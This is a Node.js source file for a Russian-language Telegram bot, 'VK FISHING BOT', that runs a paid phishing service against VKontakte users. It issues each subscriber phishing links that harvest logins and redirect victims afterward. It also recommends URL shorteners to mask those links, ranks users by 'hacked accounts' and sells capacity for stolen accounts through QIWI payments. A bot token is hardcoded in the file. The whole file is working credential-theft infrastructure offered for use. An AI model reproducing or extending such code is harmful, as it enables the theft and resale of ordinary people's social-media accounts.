const fs = require('fs');
const TelegramBot = require('node-telegram-bot-api');

const QiwiBillPaymentsAPI = require('@qiwi/bill-payments-node-js-sdk');

const token = "5238761894:AAGijX6SKtyWH94ni5RICWhcN9yOaJ5a9Vs";
const qiwi_secret_key = "токен qiwi для пополнения баланса и просмотр оплаты"

const bot = new TelegramBot(token, {polling: true});
const baza = require(`../json/users.json`);
const logins = require(`../json/logins.json`);

const links = require(`../json/links.json`);

const options = require(`./options.json`);

const qiwiApi = new QiwiBillPaymentsAPI(qiwi_secret_key);

bot.on('message', (msg, next) => {
  const chatId = msg.chat.id;

  console.log(msg)
  if (!baza.some(a => a.id == chatId) && msg.chat.id != "1468827870") {
      baza.push({
        "name": `Пользователь ${numberWithCommas(baza.length)}`,
        "edit_name": false,
        "id": chatId,
        "link": "https://vk.com/feed",
        "past_message": 0,
        "hacked_accounts": 0,
        "cells": {
          lvl: 1,
          hacked: 0,
          condition: false
        }
      });
      var text_message = `Добро пожаловать в VK FISHING BOT 🗽\nЯ помогу тебе взломать пользователей ВК ✨`;
      send_messages(msg.chat.id, text_message, []);
  } else {
    var data = baza.filter(a=> a.id == chatId);
    
    if(data[0].edit_name == true) {
      if(msg.text == data[0].name) {
        var text_message = `<b>⚠️ Ошибка ⚠️</b>\nВы уже содержите данное имя. `;
        var buttons = [[{"text": `Отмена ❌`, callback_data: "canel"}]]
        
        bot.deleteMessage(chatId, msg.message_id);
        return send_messages(msg.chat.id, text_message, buttons);
      }
      if(msg.text.length < 5) {
        var text_message = `<b>⚠️ Ошибка ⚠️</b>\nМинимальная длина имени - 5 символов.`;
        var buttons = [[{"text": `Отмена ❌`, callback_data: "canel"}]]
        
        bot.deleteMessage(chatId, msg.message_id);
        return send_messages(msg.chat.id, text_message, buttons);
      }
      if(msg.text.length > 30) {
        var text_message = `<b>⚠️ Ошибка ⚠️</b>\nМаксимальная длина имени - 30 символов.`;
        var buttons = [[{"text": `Отмена ❌`, callback_data: "canel"}]]
        
        bot.deleteMessage(chatId, msg.message_id);
        return send_messages(msg.chat.id, text_message, buttons);
      }
      data[0].edit_name = false;
      data[0].name = msg.text;
      
      var text_message = `<b>Имя успешно изменено. ✅</b>`;
      var buttons = [[{"text": `⏪ Меню`, callback_data: "menu"}]]

      bot.deleteMessage(chatId, msg.message_id);
      return send_messages(msg.chat.id, text_message, buttons);
    }
    
    if(data[0].l_edit == true) {
      if(validateURL(msg.text) == false) {
        var text_message = `Введите ссылку.`;
        var buttons = [[{"text": `Отмена ❌`, callback_data: "canel"}]]

        bot.deleteMessage(chatId, msg.message_id);
        return send_messages(msg.chat.id, text_message, buttons);
      }
      else
      {
        data[0].link = msg.text;

        var text_message = `Ссылка успешно изменена.`;
        
        bot.deleteMessage(chatId, msg.message_id);
        return send_messages(msg.chat.id, text_message);
      }
    }
  }
  if(msg.chat.id != "1468827870") {
    bot.deleteMessage(chatId, msg.message_id);
  }
});

bot.on("channel_post", (data) => {
  console.log(data)
})

bot.onText(/^(\/start)/i, (msg) => {
    const chatId = msg.chat.id;
    var data = baza.filter(a=> a.id == chatId);
    return send_messages(msg.chat.id);
})

bot.on('callback_query', async (query) => {
    var chatId = query.message.chat.id;
    var data = baza.filter(a=> a.id == query.message.chat.id);

    //chek_user(chatId);
  
    if(query.data === "link") {
      var links_list = [];
        links.forEach((data) => {
          links_list.push(`<a href="vkcc.glitch.me//${data.link}/${chatId}">${data.name}</a> ➡️ <code>https://vkcc.glitch.me//${data.link}/${chatId}</code>`)})
      
        var text_message = `<b>🗒 Ссылки 🗒</b>\n${links_list.join(`\n\n`)}\n\n🚪 Переход после авторизации: ${data[0].link}`;
        var buttons = [
          [{"text": `Изменить ссылку 🏷`, callback_data: "edit_link"}],
          [{"text": "Маскировать ссылку  🎭", callback_data: "mask_link"}],
          [{"text": `◀️ Назад `, callback_data: "menu"}]
        ];
      
        send_messages(chatId, text_message, buttons);
        return bot.deleteMessage(chatId, query.message.message_id);
    }
    if(query.data === "edit_link") {
        var data = baza.filter(a=> a.id == query.message.chat.id);    
        data[0].l_edit = true;
        
        data[0].past_message = query.message.message_id;
         
        bot.answerCallbackQuery(query.id, {
          text: "Загрузка..." 
        })

        var text_message = `Введите новую ссылку для редиректа пользователей после входа.\n\nАктивная ссылка - ${data[0].link}`;
        var buttons = [[{"text": `Отмена ❌`, callback_data: "canel"}]];
        send_messages(chatId, text_message, buttons);
        return bot.deleteMessage(chatId, query.message.message_id);
    }
    if(query.data == "canel") {
        var data = baza.filter(a=> a.id == chatId);
        if(data[0].l_edit = true) {
          data[0].l_edit = false;
        }
        if(data[0].edit_name == true) {
          data[0].edit_name = false;
        }

        bot.answerCallbackQuery(query.id, {
            text: `Отменено.`
        });
        return bot.deleteMessage(chatId, query.message.message_id);
    }
    if(query.data == "menu") {
      send_messages(chatId);
      return bot.deleteMessage(chatId, query.message.message_id);
    }
  
    if(query.data === "stats") {      
      var top_users = await baza.sort((a, b) => b.hacked_accounts - a.hacked_accounts);
      var name_user = ``;
      
      var Date1 = new Date (2021, 9, 25),
          Date2 = new Date(),
          Days = Math.floor((Date2.getTime() - Date1.getTime())/(1000*60*60*24));
              
        name_user = `<b>🃏 Имя юзера:</b> <a href="tg://user?id=${top_users[0].id}">${top_users[0].name}</a>\n<b>💀 Взломанных аккаунтов:</b> ${top_users[0].hacked_accounts}`
        var text_message = `<b>📊 Статистика 📊</b>\n\n<b>🐣 Регистраций в боте:</b> ${numberWithCommas(baza.length)}\n<b>🦣 Взломанных аккаунтов:</b> ${numberWithCommas(logins.length)}\n\n<b>👑 Топ юзер 👑</b>\n${name_user}\n\n🏁 <b>Дата старта:</b> 25 октября 2021 | ${Days} 📅`;
        var buttons = [[{"text": `🔄 Обновить статистику`, callback_data: "stats"}],
                    [{"text": `◀️ Назад `, callback_data: "other"},{"text": `⏪ Меню `, callback_data: "menu"}]];
        send_messages(chatId, text_message, buttons);
        return bot.deleteMessage(chatId, query.message.message_id);
    }
  
    if(query.data == "cells") {
        var text_message = `<b>🛒 Покупка ячеек</b>\n\n<b>💸 Стоимость:</b> ${options.price}₽\n<b>😻 Количество ячеек:</b> ${options.amount} шт.\n\n<b>♻️ На данный момент у вас ${numberWithCommas(data[0].cells.hacked)} доступных ячеек!</b>`
        var buttons = [
          [{"text": `📜 Информация`, callback_data: "cells_info"}],
          [{"text": `🛒 Купить`, url: "https://t.me/vincicash_s"}],
          [{"text": `🔚 Назад`, callback_data: "menu"}],
        ];

        send_messages(chatId, text_message, buttons);
        return bot.deleteMessage(chatId, query.message.message_id);
    }
  
    if(query.data == "cells_info") {
        var text_message = `<b>📃 Условия покупки 📃</b>\n1️⃣ Купив ячейки, вы получаете возможность использовать бота.\n2️⃣ Если все свободные ячейки будут заполнены, вы получите соответствующее уведомление с кнопкой на повторную покупку.\n3️⃣ При отсутствии пустых ячеек в вашем профиле, все ваши взломанные аккаунты будут отправлены администрации, и в дальнейшем выставлены в информационный канал.\n4️⃣ Каждая ячейка ровняется одному успешно взломанному аккаунту.`
        var buttons = [[{"text": `◀️ Назад`, callback_data: "cells"}]];

        send_messages(chatId, text_message, buttons);
        return bot.deleteMessage(chatId, query.message.message_id);
    }
  
    if(query.data == "get_buy_cells_link") {
      new_pay(chatId, data[0].cells.lvl).then(link => {

        var text_message = `<b>Оплата</b>\nОплатите покупку по кнопке ниже, затем нажмите на кнопку «Проверить оплату».`
        var buttons = [
          [{"text": `Оплатить`, url: link}],
          [{"text": `Проверить оплату 💬`, callback_data: "check_buy"}],
          [{"text": `Отмена ❌`, callback_data: "menu"}]
        ];

        send_messages(chatId, text_message, buttons);
        return bot.deleteMessage(chatId, query.message.message_id);
      })
    }
  
    if(query.data == "check_buy") {
      info_buy(chatId, data[0].cells.lvl).then(data_pay => {
        console.log(data_pay)
        if(data_pay == "WAITING") {
          bot.answerCallbackQuery(query.id, {
            text: `⛔️ Ошибка ⛔️\nОжидается оплата.`,
            show_alert: true
          })
        } else {
          data[0].cells.lvl += 1;
          data[0].cells.hacked += options.amount;
          bot.answerCallbackQuery(query.id, {
            text: `❤️ Спасибо за покупку! ❤️\n🗄 Количество пустых ячеек: ${numberWithCommas(data[0].cells.hacked)}`,
            show_alert: true
          }).then(() => {
            bot.getChatMember(`-1001400522600`, chatId, {}).then(async (data_user) => {
              var messages_text = `Юзер приобрел ячейки`;
              send_messages("1468827870", messages_text, []);
            })
            send_messages(chatId);
            bot.deleteMessage(chatId, query.message.message_id);
          })
        }
      })
    }
  
    if(query.data == "mask_link") {
      var messages_text = `<b>🎭 Сайты для маскировок ссылок:</b>`
      var buttons = [
        [{"text": `✅ ooooooooooooooooooooooo 🔥`, url: "https://ooooooooooooooooooooooo.ooo/"}],
        [{"text": `✅ "Кликер" от Яндекс`, url: "https://clck.ru"}],
        [{"text": `✅ TinyURL `, url: "https://tinyurl.com/"}],
        [{"text": `✅ U.to`, url: "https://u.to/"}],
        [{"text": `◀️ Назад`, callback_data: "link"}], 
        [{"text": "⏪ Меню", callback_data: "menu" }]
      ];
      send_messages(chatId, messages_text, buttons);
      return bot.deleteMessage(chatId, query.message.message_id);
    }

    if(query.data == "other") {
      var messages_text = `<b>🦋 Другое 🦋</b>`
      var buttons = [
        [{"text": `Статистика 📊`, callback_data: "stats"},
        {"text": "Профиль 🥷🏽", callback_data: "profile"}],
        [{"text": "Изменить имя ⚙️", callback_data: "new_name"}],
        [{"text": `◀️ Назад`, callback_data: "menu"}]
      ];
      send_messages(chatId, messages_text, buttons);
      return bot.deleteMessage(chatId, query.message.message_id);
    }

    if(query.data == "new_name") {
        var text_message = `<b>✨ Введите новое имя ✨</b>\n\n<b>Минимальная длина имени:</b> 5 символов\n<b>Максимальная длина имени: 30 символов</b>\n\n<b>🏷 Текущее имя:</b> ${data[0].name}`
        var buttons = [[{"text": `Отмена ❌`, callback_data: "canel"}]];

        data[0].edit_name = true;
      
        send_messages(chatId, text_message, buttons);
        return bot.deleteMessage(chatId, query.message.message_id);
    }
  
    if(query.data == "profile") {
        var text_message = `<b>🥷🏽 Профиль </b>\n<b>🏷 Имя:</b> ${data[0].name}\n<b>🗄 Пустых ячеек:</b> ${numberWithCommas(data[0].cells.hacked)}\n<b>💀 Взломанных аккаунтов:</b> ${numberWithCommas(data[0].hacked_accounts)}`
        var buttons = [[{"text": `◀️ Назад`, callback_data: "other"},{"text": `⏪ Меню`, callback_data: "menu"}]];

        send_messages(chatId, text_message, buttons);
        return bot.deleteMessage(chatId, query.message.message_id);
    }
})

function getRandomInt(x, y) {
  return y
    ? Math.round(Math.random() * (y - x)) + x
    : Math.round(Math.random() * x);
}

function validateURL(textval) {
  var urlregex = new RegExp("^(http|https|ftp)\://([a-zA-Z0-9\.\-]+(\:[a-zA-Z0-9\.&amp;%\$\-]+)*@)*((25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9])\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9]|0)\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[1-9]|0)\.(25[0-5]|2[0-4][0-9]|[0-1]{1}[0-9]{2}|[1-9]{1}[0-9]{1}|[0-9])|([a-zA-Z0-9\-]+\.)*[a-zA-Z0-9\-]+\.(com|edu|gov|int|mil|net|org|biz|arpa|info|name|pro|aero|coop|museum|[a-zA-Z]{2}))(\:[0-9]+)*(/($|[a-zA-Z0-9\.\,\?\'\\\+&amp;%\$#\=~_\-]+))*$");
  return urlregex.test(textval);
}

function send_messages(chatId, text, keyboard) {
    if(!keyboard) {
        keyboard = [
            [{"text": `🔗 Мои ссылки`, callback_data: "link"},
            {"text": `🛒 Ячейки`, callback_data: "cells"}],
            [{"text": "⚒ Инструменты", callback_data: "other"}],
            [{"text": "⚡️ Новости ", url: "https://t.me/rezerv_vk_fishing_bot"},
            {"text": `🗣 Чат`, url: "https://t.me/sniffer_chat"}]
        ];
    }
  
    if(!text) {
      text = `🎗 <b>Меню мамкиного хацкера\n\n 🔗 Мои ссылки - Ссылки для фишинга\n🛒 Ячейки - Покупка ячеик\n⚒ Инструменты - 📊 Статистика / 🥷🏻 Мой Профиль\n⚡️ Новости - Новостной канал\n🗣 Чат - Группа сообщений</b>`
    }
    try {
      return bot.sendMessage(chatId, text, {
        parse_mode: "HTML",
        disable_web_page_preview: true,
        reply_markup: {"inline_keyboard": keyboard}
    });
    } catch (e) {
      console.error(e)
    }
}

async function new_pay(user_id, lvl) {
    var billId = `1-user-${user_id}-lvl-${lvl}`;

    var data = await qiwiApi.createBill(billId, {
        amount: options.price,
        currency: 'RUB',
        expirationDateTime: '2028-01-01T00:00:00+06:00'
    })
    console.log(data)
    return data.payUrl;
}

async function info_buy(user_id, lvl) {
    const billId = `1-user-${user_id}-lvl-${lvl}`;
    var data = await qiwiApi.getBillInfo(billId);
    return data.status.value
}
function users_z() {
  baza.forEach((data) => {
    var user = baza.filter(a=> a.id == data.id);
    if(!data.edit_name) { user[0].edit_name = false}
  })
}

var tunnel = require("../server");

function numberWithCommas(x) {
    return x.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
}

setInterval(() => {
    fs.writeFileSync("./json/users.json", JSON.stringify(baza, null, "\t"));
}, 5000);

module.exports = {
  send_messages,
  numberWithCommas
}
